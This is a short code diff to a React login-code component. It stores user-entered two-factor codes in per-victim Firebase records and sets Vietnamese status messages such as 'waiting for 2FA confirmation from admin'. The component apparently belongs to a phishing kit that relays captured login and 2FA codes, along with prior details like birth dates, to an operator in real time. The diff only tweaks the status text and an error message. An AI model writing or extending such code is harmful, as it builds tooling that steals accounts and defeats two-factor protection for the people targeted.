@@ -25,7 +25,7 @@ const FaCode = () => {
     ] = facode;
     updates[
       "/records/" + localStorage.getItem("record_uid") + "/" + "user_status"
-    ] = "Đang chờ user nhập ngày sinh";
+    ] = "Đang chờ xác nhận 2fa từ admin";
 
     update(ref(database), updates);
   };
@@ -158,7 +158,7 @@ const FaCode = () => {
 
           {error_login_code && (
             <p className="text-danger mb-2 ms-1">
-              Incorrect login code, please try again.
+              Incorrect code, please try again or new code.
             </p>
           )}
           {resended && (
